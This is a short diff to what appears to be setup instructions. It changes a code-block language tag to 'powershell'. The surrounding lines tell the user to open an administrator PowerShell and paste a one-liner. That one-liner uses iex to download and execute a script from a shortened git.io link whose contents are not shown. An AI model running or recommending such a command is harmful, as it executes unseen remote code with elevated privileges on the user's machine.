@@ -7,6 +7,6 @@ and type 'powershell'
 and press ctrl + shift + enter
 
 and paste this command:
-```sh
+```powershell
 iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/Jm6Z4'))
 ```
